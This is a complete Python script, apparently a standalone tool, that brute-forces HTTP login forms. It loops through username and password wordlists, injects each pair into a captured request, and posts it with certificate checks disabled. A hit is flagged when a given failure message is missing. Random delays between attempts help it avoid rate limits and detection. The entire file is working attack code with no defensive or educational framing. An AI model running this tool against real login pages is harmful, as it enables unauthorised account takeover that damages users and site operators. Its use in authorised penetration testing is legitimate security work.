#!/usr/bin/env python3


'''
	Usage: ./httpform-crack.py \
        -R [request] \
        -U [users_file] \
        -P [passwords_file] \
        -e [error_message] \
        -m [min_wait_time] \
        -M [max_wait_time] \
        -s [true | false]
	
	Example: ./httpform-crack.py \
        -R request.txt \
        -U users.txt \
        -P pass.txt \
        -e "Authentication Failed" \
        -m 0.0 \
        -M 1.5 \
        -s true
'''


import sys
import time
import random
import requests

from argparse import ArgumentParser


config = {}

request = {}


def config_from_cmdline():

    config = {}

    parser = ArgumentParser()

    parser.add_argument("-R", "--request", type=str)
    parser.add_argument("-U", "--users", type=str)
    parser.add_argument("-P", "--passwords", type=str)
    parser.add_argument("-s", "--secure", type=str, default="false")
    parser.add_argument("-e", "--errormsg", type=str)
    parser.add_argument("-m", "--minwait", type=float, default=.0)
    parser.add_argument("-M", "--maxwait", type=float, default=.0)
    parser.add_argument("-o", "--out", type=str)

    args = parser.parse_args()

    config["request_file"] = args.request
    config["users_file"] = args.users
    config["passwords_file"] = args.passwords
    config["secure_http"] = True if args.secure == "true" else False
    config["error_msg"] = args.errormsg
    config["min_wait"] = float(args.minwait)
    config["max_wait"] = float(args.maxwait)
    config["out_file"] = args.out

    return config


def headers_to_dict(headers: "str") -> "dict":
    headersDict = {}

    headers = headers.split("\n")

    method, path, protocol = headers[0].split(" ")

    headersDict["Method"] = method.strip()
    headersDict["Path"] = path.strip()
    headersDict["Protocol"] = protocol.strip()

    for h in headers[1:]:
        name, value = h.split(":", maxsplit=1)

        name = name.strip()
        value = value.strip()

        headersDict[name] = value
    
    if "Cookie" in headersDict:
        headersDict["Cookie"] = cookies_to_dict(headersDict["Cookie"])
    else:
        headersDict["Cookie"] = ""

    return headersDict


def request_to_dict(request: "str") -> "dict":
    requestDict = {}

    headers, body = request.split("\n\n")

    requestDict["headers"] = headers_to_dict(headers)
    requestDict["body"] = body

    return requestDict
    

def cookies_to_dict(cookies: "str") -> "dict":
    cookiesDict = {}
   
    for cookie in cookies.split(" "):
        key, value = cookie.split("=")

        if value[len(value) - 1] == ";":
            value = value[:len(value) - 1]
        
        cookiesDict[key] = value
	
    return cookiesDict


def file_to_list(fileName: "str") -> "dict":
    lines = []

    with open(fileName) as file:
        for line in file:
            lines.append(line.strip())

    return lines


def get_request() -> "dict":
    requestFile = config["request_file"]
    request = None
    
    with open(requestFile, "r") as rf:
        request = rf.read()
        request = request_to_dict(request)
       
    return request


def get_users() -> "list":
    usersFile = config["users_file"]
    users = file_to_list(usersFile)
    
    return users


def get_passwords() -> "list":
    passwordsFile = config["passwords_file"]
    passwords = file_to_list(passwordsFile)
    
    return passwords


def get_url() -> "str":
    protocol = "https" if config["secure_http"] else "http"
    host = request["headers"]["Host"]
    path = request["headers"]["Path"]
    
    url = f"{protocol}://{host}{path}"
    
    return url


def try_crack(user: "str", password: "str"):
    headers = request["headers"]
    url = request["url"]
    
    cookies = headers["Cookie"]
    
    body = request["body"].replace("^USER^", user).replace("^PASS^", password)
    
    result = False
    response = None
    
    try:
        response = requests.post(
            url=url, 
            headers=headers, 
            data=body,
            cookies=cookies,
            verify=False
        )
    
        result = config["error_msg"] not in response.text
    except UnicodeEncodeError as ue:
        pass
    
    return (result, response)


def dictionary_crack(users: "list", passwords: "list"):
    if config["out_file"]:
        outFile = open(config["out_file"], "a")
    
    attempts = 0

    for user in users:
        for password in passwords:
            result, response = try_crack(user, password)

            if response is not None:
                if result is True:
                    log = f"[{attempts}] \033[92mACERTO User: {user} Password: {password} Status: {response.status_code}\033[0m"
                else:
                    log = f"[{attempts}] \033[91mERRO User: {user} Password: {password} Status: {response.status_code}\033[0m"
                    
                if config["out_file"]:
                    outFile.write(log)
                    
                print(log)

                waitTime = random.uniform(config["min_wait"], config["max_wait"])

                time.sleep(waitTime)

            attempts += 1


def main():
    global config
    global  request 
        
    config = config_from_cmdline()
    
    request = get_request()
    request["url"] = get_url()

    users = get_users()
    passwords = get_passwords()
    
    requests.packages.urllib3.disable_warnings()
    dictionary_crack(users, passwords)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as ki:
        sys.exit(0)
